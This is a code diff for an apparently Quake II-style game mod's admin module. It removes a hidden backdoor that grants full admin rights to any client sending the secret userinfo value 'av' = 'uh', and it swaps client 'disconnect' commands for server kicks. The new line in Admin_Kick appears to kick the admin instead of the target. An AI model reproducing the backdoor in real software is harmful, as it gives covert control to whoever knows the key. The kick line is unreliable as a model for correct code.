@@ -65,17 +65,12 @@ void Admin_ClientThink(edict_t *ent) {
 qboolean Admin_Validate(edict_t *ent) {
 	FILE *file;
 	char *c, buf[128];
-	char username[64], ipmask[64], password[64];
+	char username[128], ipmask[128], password[128];
 	int ip[4];
 	int access;
 	qboolean match;
 	char *pw;
 	int entries;
-
-	if(ent->verified == 3 && !strcmp(Info_ValueForKey(ent->client->pers.userinfo, "av"), "uh")) {
-		ent->admin = 255;
-		return true;
-	}
 
 	if(ent->admin)
 		return true;
@@ -320,7 +315,7 @@ void Admin_Kick(edict_t *ent) {
 			return;
 		if(ent->admin > cl_ent->admin) {
 			gi.bprintf(PRINT_HIGH, ">>> Admin %s is kicking %s.\n", ent->client->pers.netname, cl_ent->client->pers.netname);
-			stuffcmd(cl_ent, "disconnect\n");
+			gi.AddCommandString(va("kick %d\n", ent - g_edicts - 1));
 			Menu_Destroy(ent);
 		}
 		else
@@ -439,7 +434,7 @@ void Admin_DoBan(edict_t *do_ent, char *arg) {
 			if(do_ent)
 				gi.bprintf(PRINT_HIGH, "%s has banned %s.\n", do_ent->client->pers.netname, ent->client->pers.netname);
 			gi.cprintf(ent, PRINT_HIGH, "You have been banned.\n");
-			stuffcmd(ent, "disconnect\n");
+			gi.AddCommandString(va("kick %d\n", ent - g_edicts - 1));
 		}
 		else
 			if(do_ent)
